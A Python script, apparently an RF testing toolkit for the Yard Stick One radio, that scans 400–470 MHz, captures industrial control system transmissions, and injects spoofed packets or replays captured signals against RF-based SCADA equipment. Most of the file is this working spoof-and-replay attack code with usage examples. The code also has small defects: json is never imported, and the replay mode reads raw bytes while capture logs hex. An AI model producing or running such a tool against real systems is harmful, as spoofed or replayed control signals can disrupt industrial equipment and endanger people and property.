import sys
import time
import argparse
from rflib import *

# -------------------------------------------
# Yard Stick One Industrial Control System (ICS) Testing Toolkit
# -------------------------------------------
# Features:
# - Captures and analyzes RF-based industrial control system (ICS) transmissions.
# - Tests vulnerabilities in RF-based SCADA systems.
# - Supports protocol detection, logging, and packet modification.
# - Implements active attack modes including spoofing and replay attacks.
#
# Requirements:
# - Yard Stick One (YardStickOne) hardware
# - RfCat Python library
# - Python 3.x
#
# Usage:
# python yardstick_ics_testing.py --freq 433920000 --capture
# python yardstick_ics_testing.py --freq 433920000 --spoof "A1B2C3D4"
# python yardstick_ics_testing.py --scan
# python yardstick_ics_testing.py --log ics_capture.json
# python yardstick_ics_testing.py --replay "last_capture.bin"
# -------------------------------------------

def configure_device(d, frequency, power, modulation):
    """Configures the Yard Stick One device for RX and TX."""
    d.setModeRX()
    d.setFreq(frequency)
    d.setMaxPower() if power == 10 else d.setPower(power)
    
    modulations = {
        "OOK": MOD_ASK_OOK,
        "FSK": MOD_FSK,
        "ASK": MOD_ASK_OOK
    }
    
    if modulation in modulations:
        d.setMdmModulation(modulations[modulation])
    else:
        print(f"[!] Invalid modulation type: {modulation}. Defaulting to FSK.")
        d.setMdmModulation(MOD_FSK)
    
    d.setMdmDRate(4800)  # Default baud rate
    print(f"[*] Configured: Frequency {frequency / 1e6} MHz, Power {power}, Modulation {modulation}")

def capture_ics_traffic(d, log_file=None):
    """Captures industrial control system transmissions and logs them."""
    print("[+] Capturing ICS traffic... Press Ctrl+C to stop.")
    data_log = []
    try:
        while True:
            packet = d.RFrecv(timeout=5000)
            if packet:
                log_entry = {"timestamp": time.time(), "data": packet.hex()}
                print(f"[+] Captured ICS Data: {packet.hex()}")
                data_log.append(log_entry)
                if log_file:
                    with open(log_file, "w") as f:
                        json.dump(data_log, f, indent=4)
    except KeyboardInterrupt:
        print("[!] Capture mode stopped.")

def spoof_ics_packet(d, payload):
    """Injects spoofed data into ICS communications."""
    print("[+] Spoofing ICS packet...")
    try:
        data = bytes.fromhex(payload)
        d.setModeTX()
        d.RFxmit(data)
        print(f"[+] Sent spoofed packet: {payload}")
    except Exception as e:
        print(f"[!] Error transmitting spoofed packet: {e}")

def replay_ics_signal(d, filename):
    """Replays a captured ICS signal."""
    print(f"[+] Replaying captured ICS signal from {filename}...")
    try:
        with open(filename, "rb") as f:
            packet = f.read()
            d.setModeTX()
            d.RFxmit(packet)
            print(f"[+] Replayed signal: {packet.hex()}")
    except Exception as e:
        print(f"[!] Error replaying ICS signal: {e}")

def scan_ics_frequencies(d):
    """Scans the frequency range for active ICS signals."""
    print("[+] Scanning for ICS signals...")
    active_freqs = []
    for freq in range(400000000, 470000000, 1000000):  # Scanning in 1 MHz steps
        d.setFreq(freq)
        packet = d.RFrecv(timeout=3000)
        if packet:
            print(f"[+] Active ICS signal detected at {freq / 1e6} MHz")
            active_freqs.append(freq)
    print("[+] Scan complete. Detected frequencies:", active_freqs)

def main():
    parser = argparse.ArgumentParser(description="Yard Stick One Industrial Control System (ICS) Testing Toolkit")
    parser.add_argument("--freq", type=int, help="Transmission frequency in Hz")
    parser.add_argument("--power", type=int, default=10, help="Transmission power level (default: 10)")
    parser.add_argument("--modulation", type=str, choices=["OOK", "FSK", "ASK"], default="FSK", help="Modulation type (default: FSK)")
    parser.add_argument("--capture", action='store_true', help="Capture ICS transmissions")
    parser.add_argument("--spoof", type=str, help="Inject spoofed ICS packet (hex string)")
    parser.add_argument("--scan", action='store_true', help="Scan for active ICS signals")
    parser.add_argument("--log", type=str, help="Log captured data to file (JSON format)")
    parser.add_argument("--replay", type=str, help="Replay a captured ICS signal from file")
    args = parser.parse_args()

    try:
        d = RfCat()
        configure_device(d, args.freq, args.power, args.modulation)
        
        if args.capture:
            capture_ics_traffic(d, args.log)
        elif args.spoof:
            spoof_ics_packet(d, args.spoof)
        elif args.scan:
            scan_ics_frequencies(d)
        elif args.replay:
            replay_ics_signal(d, args.replay)
        else:
            print("[!] No mode specified.")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        d.setModeIDLE()
        d.cleanup()

if __name__ == "__main__":
    main()
